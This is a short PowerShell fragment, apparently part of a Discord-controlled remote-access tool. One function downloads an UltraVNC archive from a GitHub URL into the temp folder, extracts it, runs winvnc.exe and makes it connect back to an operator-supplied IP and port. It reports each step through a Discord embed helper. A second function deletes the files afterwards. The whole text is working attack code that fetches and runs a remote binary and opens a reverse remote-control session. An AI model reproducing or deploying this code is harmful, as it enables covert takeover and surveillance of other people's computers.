#ENABLEUVNC
Function MStartUvnc {
    param([string]$ip,[string]$port)
    sendEmbedWithImage -Title "UVNC CLIENT DOWNLOADING" -Description "UVNC client listener should be running and attempting to connect to $ip on port $port."

    $tempFolder = "$env:temp\vnc"
    $vncDownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/UltraVNC.zip"
    $vncZip = "$tempFolder\UltraVNC.zip" 
    if (!(Test-Path -Path $tempFolder)) {
        New-Item -ItemType Directory -Path $tempFolder | Out-Null
    }  
    if (!(Test-Path -Path $vncZip)) {
        Iwr -Uri $vncDownload -OutFile $vncZip
    }
    Start-Sleep 1
    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
    Start-Sleep 1 
    rm -Path $vncZip -Force  
    $proc = "$tempFolder\winvnc.exe"
    sendEmbedWithImage -Title "UVNC CLIENT DOWNLOADED" -Description "UVNC client downloaded"
    Start-Process $proc -ArgumentList ("-run")
    Start-Sleep 2
    Start-Process $proc -ArgumentList ("-connect $ip::$port")
}
#DISABLEUVNC
Function MRemoveUVNC {
    sendEmbedWithImage -Title "REMOVING UVNC CLIENT" -Description "Cleaning up UVNC client files..."
    $tempFolder = "$env:temp\vnc"
    if (Test-Path -Path $tempFolder) {
        rm -Path $tempFolder -Force 
        
    }
    sendEmbedWithImage -Title "UVNC CLIENT REMOVED" -Description "UVNC client files have been removed."
}
